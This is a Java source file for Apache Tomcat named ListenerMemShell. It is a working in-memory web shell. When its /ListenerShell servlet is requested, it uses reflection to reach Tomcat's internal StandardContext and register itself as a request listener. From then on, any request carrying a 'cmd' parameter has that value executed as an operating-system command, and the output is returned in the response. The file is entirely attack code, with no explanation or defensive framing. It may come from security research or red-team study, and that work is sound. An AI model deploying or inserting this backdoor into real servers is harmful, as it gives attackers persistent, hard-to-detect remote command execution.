package Listener;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.*;

@WebServlet("/ListenerShell")
public class ListenerMemShell extends HttpServlet implements ServletRequestListener {
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        String cmd;
        try {
            cmd = sre.getServletRequest().getParameter("cmd");
            org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();
            Field requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");
            requestField.setAccessible(true);
            Request request = (Request) requestField.get(requestFacade);
            Response response = request.getResponse();

            if (request.getParameter("cmd") != null) {

                InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
//
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);

                return;
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
        ServletContext servletContext =  req.getSession().getServletContext();
        Field applicationContextField = null;
        try {
            applicationContextField = servletContext.getClass().getDeclaredField("context");
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        }
        applicationContextField.setAccessible(true);
        ApplicationContext applicationContext = null;
        try {
            applicationContext = (ApplicationContext) applicationContextField.get(servletContext);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }

        Field standardContextField = null;
        try {
            standardContextField = applicationContext.getClass().getDeclaredField("context");
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        }
        standardContextField.setAccessible(true);
        StandardContext standardContext = null;
        try {
            standardContext = (StandardContext) standardContextField.get(applicationContext);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }

        Object[] objects = standardContext.getApplicationEventListeners();
        List<Object> listeners = Arrays.asList(objects);
        List<Object> arrayList = new ArrayList(listeners);
//        List<Object> arrayList = new ArrayList<>();
        arrayList.add(new ListenerMemShell());
        standardContext.setApplicationEventListeners(arrayList.toArray());
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doPost(req, resp);
    }
}
